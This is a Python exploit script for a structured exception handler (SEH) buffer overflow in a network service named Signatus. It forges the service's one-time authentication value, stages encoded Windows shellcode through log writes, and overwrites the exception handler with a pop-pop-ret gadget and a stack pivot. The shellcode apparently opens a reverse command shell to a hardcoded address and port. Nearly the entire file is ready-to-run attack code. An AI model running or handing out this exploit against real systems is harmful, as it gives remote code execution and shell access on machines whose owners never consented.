#!/usr/bin/python3

# SEH Overflow Exploit for Signatus
# William Moody, 13.06.2021

import sys
import time
import socket
from struct import pack

# Check that all required params are passed
if len(sys.argv) != 2:
    print("Usage: %s SERVER" % sys.argv[0])
    sys.exit(1)

# Server IP and port variables
server = sys.argv[1]
port = 9999

# Gets the one time dword required to authenticate with the server
OTD_SECRET = 0x74829726
def getOTD():
    seconds = int(time.time()) + 3599
    s = (seconds // 10) & 0xff
    sec_d = s | (((s*s) >> 4) << 8) \
        | (((s*s*s) >> 8) << 16) | ((s*s*s*s) >> 12) << 24
    return (sec_d ^ OTD_SECRET) & 0xffffffff

# Sends a packet to the server and port defined as global variables
def s_send(buf):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

shell = b'\x89\xe5\xb8\xf0\xf9\xff\xffk\xc0\x01\x01\xc4\xeb\x06^\x89u\x04\xebP\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18O\x8bG!G\x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x03\x01\xc2\xeb\xf4\xeb+^\x8b6\xeb\xbb;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8L\x89D$!D^aYZQ\xff\xe0\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_ThU\x12\x81\xc0\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\xb8&\x0f\xb0\xffU\x041\xc0PPP\xb0\x06P,\x05P@Ph\x89&\xa5P\xffU\x04\x89\xc61\xc0PPh\xc0\xa8\x01nf\xb8\x11[\xc1\xe0\x10f\x83\xc0\x02PT_1\xc0PPPP\x04\x10PWVh\xba&\xd12\xffU\x04VVV1\xc0H\x8dH\x0e@P\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\x8fu-\x92\xffU\x041\xc9Qj\xffh\x97\xaae}\xffU\x04'

# < Clear the log >
# So that we know we control all of the log
# and wont get messed up from previous entries
buf  = pack("<I", getOTD())
buf += pack("<I", 0x3)
s_send(buf)

# < Write to log >
# Beginning of offset / shellcode
buf  = pack("<I", getOTD())
buf += pack("<I", 0x1)
buf += shell
buf += b"A" * (2047 - len(shell)) # offset
s_send(buf)

# < Write to log >
# Remainder of offset, SEH overwrite
buf  = pack("<I", getOTD())
buf += pack("<I", 0x1)
buf += b"B" * 129              # offset continued...
buf += b"\xeb\x06\x90\x90"     # nSeh      -> jmp 0x6 ; nop ; nop (jump over eip into short shellcode part below)
buf += pack("<I", 0x60ae1b2b)  # eip / seh -> pop ecx ; pop ecx ; ret
buf += b"\xb8\xc0\xf8\xff\xff" # mov eax, 0xfffff8c0 (redirect execution to top of buffer [shellcode])
buf += b"\xf7\xd8"             # neg eax
buf += b"\x01\xc4"             # add esp, eax
buf += b"\xff\xe4"             # jmp esp
buf += b"C" * 33               # required to trigger the seh overwrite rather than another crash
s_send(buf)

# < Read from log >
# Trigger the overflow
buf  = pack("<I", getOTD())
buf += pack("<I", 0x2)
s_send(buf)
